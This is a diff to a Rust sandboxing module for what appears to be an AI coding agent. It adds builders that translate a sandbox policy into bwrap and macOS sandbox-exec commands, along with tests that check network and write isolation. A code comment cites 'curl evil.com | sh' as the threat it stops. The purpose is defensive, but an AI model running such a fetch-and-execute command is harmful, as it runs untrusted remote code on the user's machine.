@@ -121,6 +121,7 @@ const MAX_OUTPUT_CHARS: usize = 100_000;
 /// This stops the most common attack vector: the LLM running
 /// `curl evil.com | sh` or exfiltrating data via network.
 /// File operations within the project directory still work.
+#[cfg(any(target_os = "macos", test))]
 const PROFILE_DEFAULT: &str = "\
 (version 1)\
 (allow default)\
@@ -135,6 +136,7 @@ const PROFILE_DEFAULT: &str = "\
 
 /// Strict profile: deny network and all file writes outside cwd.
 /// No /tmp access either.
+#[cfg(any(target_os = "macos", test))]
 const PROFILE_STRICT: &str = "\
 (version 1)\
 (allow default)\
@@ -361,6 +363,165 @@ pub fn build_bwrap_command(command: &str, profile: &str, working_dir: &str) -> S
     }
 }
 
+// ---------------------------------------------------------------------------
+// Policy-based command builders — translate SandboxPolicy to OS commands.
+// ---------------------------------------------------------------------------
+
+use crate::sandbox::policy::{Access, PathAccess, SandboxPolicy};
+
+/// Build a Linux bwrap command from a `SandboxPolicy`.
+///
+/// Translates intent into bwrap flags:
+/// - `network: Deny` → `--unshare-net`
+/// - `file_write: RestrictTo(paths)` → `--ro-bind / /` + `--bind <p> <p>` per path
+/// - `file_write: Deny` → `--ro-bind / /` only
+/// - `file_write: Allow` → `--bind / /`
+/// - `process_exec: Deny` → `--unshare-pid`
+///
+/// Not gated by #[cfg] so it can be tested on any platform.
+pub fn build_bwrap_command_from_policy(
+    command: &str,
+    policy: &SandboxPolicy,
+    _working_dir: &str,
+) -> String {
+    let escaped = escape_single_quotes(command);
+    let mut parts = Vec::new();
+
+    parts.push("bwrap".to_string());
+
+    // Filesystem access.
+    match &policy.file_write {
+        PathAccess::Allow => {
+            // Full write access — bind root writable.
+            parts.push("--bind / /".to_string());
+        }
+        PathAccess::Deny => {
+            // Read-only root, no writable mounts.
+            parts.push("--ro-bind / /".to_string());
+        }
+        PathAccess::RestrictTo(paths) => {
+            // Read-only root + writable binds for specific paths.
+            parts.push("--ro-bind / /".to_string());
+            for path in paths {
+                let p = escape_single_quotes(&path.to_string_lossy());
+                parts.push(format!("--bind '{p}' '{p}'"));
+            }
+        }
+    }
+
+    // Always need /dev and /proc.
+    parts.push("--dev /dev".to_string());
+    parts.push("--proc /proc".to_string());
+
+    // Network isolation.
+    if policy.network == Access::Deny {
+        parts.push("--unshare-net".to_string());
+    }
+
+    // PID isolation (when process_exec is denied).
+    if policy.process_exec == Access::Deny {
+        parts.push("--unshare-pid".to_string());
+    }
+
+    // Safety net: kill sandbox if parent exits.
+    parts.push("--die-with-parent".to_string());
+
+    // The command to run.
+    parts.push(format!("bash -c '{escaped}'"));
+
+    parts.join(" ")
+}
+
+/// Build a macOS sandbox-exec command from a `SandboxPolicy`.
+///
+/// Translates intent into Seatbelt S-expressions:
+/// - `network: Deny` → `(deny network*)`
+/// - `file_write: RestrictTo(paths)` → `(deny file-write* (require-not (require-any ...)))`
+/// - `file_write: Deny` → `(deny file-write*)`
+/// - `file_write: Allow` → (no deny rule)
+///
+/// Not gated by #[cfg] so it can be tested on any platform.
+pub fn build_seatbelt_command_from_policy(
+    command: &str,
+    policy: &SandboxPolicy,
+    working_dir: &str,
+) -> String {
+    let mut profile_parts = Vec::new();
+    profile_parts.push("(version 1)".to_string());
+    profile_parts.push("(allow default)".to_string());
+
+    // Network.
+    if policy.network == Access::Deny {
+        profile_parts.push("(deny network*)".to_string());
+    }
+
+    // File write.
+    match &policy.file_write {
+        PathAccess::Deny => {
+            profile_parts.push("(deny file-write*)".to_string());
+        }
+        PathAccess::RestrictTo(paths) => {
+            let mut exceptions = Vec::new();
+            for path in paths {
+                exceptions.push(format!(
+                    "(subpath \"{}\")",
+                    path.to_string_lossy()
+                ));
+            }
+            if exceptions.is_empty() {
+                profile_parts.push("(deny file-write*)".to_string());
+            } else {
+                profile_parts.push(format!(
+                    "(deny file-write* (require-not (require-any {})))",
+                    exceptions.join(" ")
+                ));
+            }
+        }
+        PathAccess::Allow => {
+            // No restriction on writes.
+        }
+    }
+
+    // File read.
+    match &policy.file_read {
+        PathAccess::Deny => {
+            profile_parts.push("(deny file-read*)".to_string());
+        }
+        PathAccess::RestrictTo(paths) => {
+            let mut exceptions = Vec::new();
+            for path in paths {
+                exceptions.push(format!(
+                    "(subpath \"{}\")",
+                    path.to_string_lossy()
+                ));
+            }
+            // Always allow reading system libraries and executables.
+            exceptions.push("(subpath \"/usr\")".to_string());
+            exceptions.push("(subpath \"/bin\")".to_string());
+            exceptions.push("(subpath \"/sbin\")".to_string());
+            exceptions.push("(subpath \"/Library\")".to_string());
+            exceptions.push("(subpath \"/System\")".to_string());
+
+            profile_parts.push(format!(
+                "(deny file-read* (require-not (require-any {})))",
+                exceptions.join(" ")
+            ));
+        }
+        PathAccess::Allow => {
+            // No restriction on reads.
+        }
+    }
+
+    let profile = profile_parts.join("");
+
+    format!(
+        "sandbox-exec -p '{}' -D WORKING_DIR='{}' bash -c '{}'",
+        escape_single_quotes(&profile),
+        escape_single_quotes(working_dir),
+        escape_single_quotes(command),
+    )
+}
+
 // ===========================================================================
 // Tests
 // ===========================================================================
@@ -368,6 +529,7 @@ pub fn build_bwrap_command(command: &str, profile: &str, working_dir: &str) -> S
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::path::PathBuf;
     use crate::tool::ToolContext;
 
     // -----------------------------------------------------------------------
@@ -610,5 +772,264 @@ mod tests {
         sandbox.after("bash", &input, &mut output).await.unwrap();
 
         assert_eq!(output.content, "small result");
+    }
+
+    // -----------------------------------------------------------------------
+    // Policy-based bwrap command builder tests
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn bwrap_policy_deny_network() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/workspace")]),
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("--unshare-net"), "should deny network");
+        assert!(cmd.contains("--ro-bind / /"), "should have read-only root");
+        assert!(cmd.contains("--bind '/workspace' '/workspace'"), "should bind working dir");
+        assert!(cmd.contains("--die-with-parent"));
+        assert!(cmd.contains("bash -c 'ls'"));
+    }
+
+    #[test]
+    fn bwrap_policy_allow_network() {
+        let policy = SandboxPolicy {
+            network: Access::Allow,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::Allow,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy("curl example.com", &policy, "/workspace");
+        assert!(!cmd.contains("--unshare-net"), "should allow network");
+        assert!(cmd.contains("--bind / /"), "should have writable root");
+        assert!(!cmd.contains("--ro-bind"), "should not be read-only");
+    }
+
+    #[test]
+    fn bwrap_policy_deny_all_writes() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::Deny,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("--ro-bind / /"), "should be read-only");
+        // No --bind for writable paths.
+        assert!(!cmd.contains("--bind '/"), "should have no writable binds");
+    }
+
+    #[test]
+    fn bwrap_policy_multiple_write_paths() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::RestrictTo(vec![
+                PathBuf::from("/workspace"),
+                PathBuf::from("/tmp"),
+            ]),
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("--bind '/workspace' '/workspace'"));
+        assert!(cmd.contains("--bind '/tmp' '/tmp'"));
+    }
+
+    #[test]
+    fn bwrap_policy_deny_process_exec() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::Deny,
+            process_exec: Access::Deny,
+        };
+        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("--unshare-pid"), "should isolate PID namespace");
+    }
+
+    #[test]
+    fn bwrap_policy_escapes_command_quotes() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::Deny,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy("echo 'hello'", &policy, "/workspace");
+        assert!(cmd.contains("'\\''"));
+    }
+
+    // -----------------------------------------------------------------------
+    // Policy-based seatbelt command builder tests
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn seatbelt_policy_deny_network() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::Allow,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("sandbox-exec"));
+        assert!(cmd.contains("deny network"));
+        assert!(!cmd.contains("deny file-write"));
+    }
+
+    #[test]
+    fn seatbelt_policy_allow_network() {
+        let policy = SandboxPolicy {
+            network: Access::Allow,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::Allow,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_seatbelt_command_from_policy("curl example.com", &policy, "/workspace");
+        assert!(!cmd.contains("deny network"));
+    }
+
+    #[test]
+    fn seatbelt_policy_deny_writes() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::Deny,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("deny file-write*"));
+    }
+
+    #[test]
+    fn seatbelt_policy_restrict_writes_to_paths() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::RestrictTo(vec![
+                PathBuf::from("/workspace"),
+                PathBuf::from("/tmp"),
+            ]),
+            process_exec: Access::Allow,
+        };
+        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("deny file-write*"));
+        assert!(cmd.contains("require-not"));
+        assert!(cmd.contains("subpath \"/workspace\""));
+        assert!(cmd.contains("subpath \"/tmp\""));
+    }
+
+    #[test]
+    fn seatbelt_policy_deny_reads() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Deny,
+            file_write: PathAccess::Deny,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("deny file-read*"));
+    }
+
+    #[test]
+    fn seatbelt_policy_restrict_reads() {
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::RestrictTo(vec![PathBuf::from("/workspace")]),
+            file_write: PathAccess::Deny,
+            process_exec: Access::Allow,
+        };
+        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
+        assert!(cmd.contains("deny file-read*"));
+        assert!(cmd.contains("require-not"));
+        assert!(cmd.contains("subpath \"/workspace\""));
+        // Should include system paths.
+        assert!(cmd.contains("subpath \"/usr\""));
+    }
+
+    // -----------------------------------------------------------------------
+    // Policy-based execution tests (platform-specific)
+    // -----------------------------------------------------------------------
+
+    #[cfg(target_os = "linux")]
+    #[tokio::test]
+    async fn linux_policy_blocks_network() {
+        use crate::tool::bash::BashTool;
+        use crate::tool::Tool;
+
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/tmp")]),
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy(
+            "curl -s --max-time 2 https://example.com",
+            &policy,
+            "/tmp",
+        );
+
+        let tool = BashTool::default();
+        let ctx = ToolContext::from_cwd().unwrap();
+        let output = tool
+            .run(serde_json::json!({"command": cmd}), &ctx)
+            .await
+            .unwrap();
+        assert!(output.is_error, "expected network to be blocked by bwrap policy");
+    }
+
+    #[cfg(target_os = "linux")]
+    #[tokio::test]
+    async fn linux_policy_allows_network() {
+        // Verify the generated command does NOT contain --unshare-net
+        // when network is allowed.  We test the command shape rather
+        // than actually making a network call, since CI may not have
+        // internet access.
+        let policy = SandboxPolicy {
+            network: Access::Allow,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/tmp")]),
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy("echo ok", &policy, "/tmp");
+        assert!(
+            !cmd.contains("--unshare-net"),
+            "network: Allow should not include --unshare-net: {cmd}"
+        );
+        assert!(cmd.contains("bwrap"));
+    }
+
+    #[cfg(target_os = "linux")]
+    #[tokio::test]
+    async fn linux_policy_blocks_writes_outside_allowed() {
+        use crate::tool::bash::BashTool;
+        use crate::tool::Tool;
+
+        let policy = SandboxPolicy {
+            network: Access::Deny,
+            file_read: PathAccess::Allow,
+            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/tmp/sandbox-test")]),
+            process_exec: Access::Allow,
+        };
+        let cmd = build_bwrap_command_from_policy(
+            "touch /var/tmp/should-fail",
+            &policy,
+            "/tmp/sandbox-test",
+        );
+
+        let tool = BashTool::default();
+        let ctx = ToolContext::from_cwd().unwrap();
+        let output = tool
+            .run(serde_json::json!({"command": cmd}), &ctx)
+            .await
+            .unwrap();
+        assert!(
+            output.is_error,
+            "expected write to /var/tmp to be blocked: {}",
+            output.content
+        );
     }
 }
